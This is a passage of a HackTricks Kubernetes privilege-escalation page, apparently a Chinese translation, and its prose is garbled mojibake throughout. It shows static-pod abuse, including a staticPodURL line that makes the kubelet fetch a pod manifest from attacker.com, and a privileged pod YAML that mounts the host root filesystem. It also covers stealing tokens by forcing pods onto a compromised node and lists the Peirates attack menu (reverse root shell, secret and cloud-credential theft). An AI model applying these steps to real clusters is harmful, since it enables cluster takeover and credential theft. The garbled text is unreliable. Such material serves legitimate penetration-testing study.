å¦‚æœä½ åœ¨èŠ‚ç‚¹ä¸»æœºå†…éƒ¨ï¼Œä½ å¯ä»¥è®©å®ƒåœ¨è‡ªèº«å†…éƒ¨åˆ›å»ºä¸€ä¸ª**é™æ€ pod**ã€‚è¿™éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯èƒ½å…è®¸ä½ **åœ¨ä¸åŒçš„å‘½åç©ºé—´åˆ›å»º pod**ï¼Œå¦‚ **kube-system**ã€‚

ä¸ºäº†åˆ›å»ºä¸€ä¸ªé™æ€ podï¼Œ[**æ–‡æ¡£æä¾›äº†å¾ˆå¤§å¸®åŠ©**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚ä½ åŸºæœ¬ä¸Šéœ€è¦ä¸¤ä»¶äº‹ï¼š

* åœ¨ **kubelet æœåŠ¡**ä¸­é…ç½®å‚æ•° **`--pod-manifest-path=/etc/kubernetes/manifests`**ï¼Œæˆ–åœ¨ **kubelet é…ç½®**ä¸­ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰å¹¶é‡å¯æœåŠ¡
* åœ¨ **`/etc/kubernetes/manifests`** ä¸­åˆ›å»º **pod å®šä¹‰**

**å¦ä¸€ä¸ªæ›´éšè”½çš„æ–¹æ³•æ˜¯ï¼š**

* ä¿®æ”¹ **kubelet** é…ç½®æ–‡ä»¶ä¸­çš„å‚æ•° **`staticPodURL`** å¹¶è®¾ç½®ç±»ä¼¼ `staticPodURL: http://attacker.com:8765/pod.yaml`ã€‚è¿™å°†ä½¿ kubelet è¿›ç¨‹åˆ›å»ºä¸€ä¸ª**é™æ€ pod**ï¼Œä»æŒ‡å®šçš„ URL è·å–**é…ç½®**ã€‚

**ç¤ºä¾‹**ï¼Œ**pod** é…ç½®åˆ›å»ºä¸€ä¸ªåœ¨ **kube-system** ä¸­çš„ç‰¹æƒ podï¼Œå–è‡ª[**è¿™é‡Œ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### åˆ é™¤ Pods + ä¸å¯è°ƒåº¦èŠ‚ç‚¹

å¦‚æœæ”»å‡»è€…**å±åŠäº†ä¸€ä¸ªèŠ‚ç‚¹**ï¼Œå¹¶ä¸”ä»–èƒ½å¤Ÿä»å…¶ä»–èŠ‚ç‚¹**åˆ é™¤ pods** å¹¶**ä½¿å…¶ä»–èŠ‚ç‚¹æ— æ³•æ‰§è¡Œ pods**ï¼Œé‚£ä¹ˆ pods å°†åœ¨è¢«å±åŠçš„èŠ‚ç‚¹ä¸Šé‡æ–°è¿è¡Œï¼Œä»–å°†èƒ½å¤Ÿ**çªƒå–**åœ¨å…¶ä¸­è¿è¡Œçš„ tokensã€‚\
æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·å…³æ³¨è¿™äº›é“¾æ¥**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
